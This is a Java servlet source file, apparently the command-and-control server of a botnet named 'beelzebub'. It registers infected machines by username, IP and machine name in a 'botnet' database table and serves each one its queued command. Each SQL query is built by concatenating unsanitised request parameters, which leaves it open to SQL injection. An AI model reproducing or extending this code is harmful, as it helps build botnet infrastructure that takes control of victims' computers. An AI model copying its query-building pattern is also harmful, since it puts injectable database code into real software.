/*
 *  Licensed to the Apache Software Foundation (ASF) under one or more
 *  contributor license agreements.  See the NOTICE file distributed with
 *  this work for additional information regarding copyright ownership.
 *  The ASF licenses this file to You under the Apache License, Version 2.0
 *  (the "License"); you may not use this file except in compliance with
 *  the License.  You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package beelzebub.servlets;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintStream;
import java.io.PrintWriter;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.nio.ByteBuffer;
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import java.sql.Timestamp;
import java.time.LocalDateTime;
import java.time.LocalTime;
import java.time.format.DateTimeFormatter;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.websocket.OnClose;
import javax.websocket.OnError;
import javax.websocket.OnMessage;
import javax.websocket.OnOpen;
import javax.websocket.PongMessage;
import javax.websocket.Session;
import javax.websocket.server.ServerEndpoint;

/**
 * 
 *
 */

//@ServerEndpoint("/BotSocket")
@WebServlet("/Command")
	public class BotSocket extends HttpServlet {
		private static final long serialVersionUID = 1L;
	String command = null;
		
		DatabaseManager dbm = new DatabaseManager();
		Statement statement = null;
		ResultSet rs = null ;
		
		//DateTimeFormatter dtf = DateTimeFormatter.ofPattern("HH:mm:ss");
		LocalDateTime now = LocalDateTime.now();
		Timestamp timestamp = Timestamp.valueOf(now);
		
	
	protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
	
		PrintWriter out = response.getWriter();
		String action = request.getParameter("name");
		String IP = request.getParameter("id");
		String firstCommand = request.getParameter("command");
		
		if(action.equals("initialise")) {
			String username = request.getParameter("username");
			String machine = request.getParameter("machine");
			initaliseBot(username, IP, machine, firstCommand, timestamp);

		}
		
		if(action.equals("Command")) {
			// Update Activity
			updateBotActivity(IP);
			//timestamp = Timestamp.valueOf(now);
			timestamp = null;
			timestamp = new Timestamp(System.currentTimeMillis());
			
			// Connect to DB
			Connection dbConn = dbm.connect();
			String dbGetCommand = "SELECT command FROM botnet where ip='"+IP.toString()+"' ;";
			String dbUpdateActivity = "UPDATE botnet SET last_access='"+ timestamp +"' WHERE ip = '"+IP+"' ;";
			try {													//dtf.format(now)
				statement = dbConn.createStatement();
				statement.execute(dbGetCommand);
				rs = statement.getResultSet();
				while (rs.next()) {
					command = rs.getString("command");
				}
				//Update time of activity of bot.
				statement.execute(dbUpdateActivity);
			} catch (SQLException e) {
				e.printStackTrace();
			}
			
			 // Return Command
			
			try {
	    		// Cleanup
				dbConn.close();
				statement.close();
				rs.close();
			} catch (SQLException e) {
				e.printStackTrace();
			}
			
			out.write(command);
		} 
		request.setAttribute("command", command);
		//request.getRequestDispatcher("/index.jsp").forward(request, response);
		//request.setAttribute("command", command);
		
	}
	
	protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		
		doGet(request, response);
		
	}
	
	//@SuppressWarnings("null")
	private void initaliseBot(String username, String IP, String machine, String firstCommand, Timestamp last_access) {

		Connection dbConn = dbm.connect();
		String dbCheckBot = "SELECT IP FROM botnet WHERE IP='"+IP+"';";
		String dbInitialiseBot = "INSERT INTO botnet (username, IP, machine, command, last_access, status) VALUES (\'"+username+"\', \'"+IP+"\', \'"+machine+"\', \'"+firstCommand+"\', \'"+last_access+"\', \'true\') ;";
		ResultSet rs = null;
		String result = null;
		try {
			statement = dbConn.createStatement();
			
			Boolean BotExists = false;
			
			statement.execute(dbCheckBot);
			rs = statement.getResultSet(); 
			while(rs.next()){
				result = rs.getString("IP");
				if(result != null) {
					BotExists = true;
				}
			}
			if(!BotExists) {
				statement.execute(dbInitialiseBot);
			}
			
		} catch (SQLException e) {
			e.printStackTrace();
		}
		
		// Return Command
		
		try {
    		// Cleanup
			dbConn.close();
			statement.close();
			//rs.close();
		} catch (SQLException e) {
			e.printStackTrace();
		}
		
		
	}
	
	private void updateBotActivity(String IP) {
		
	}
}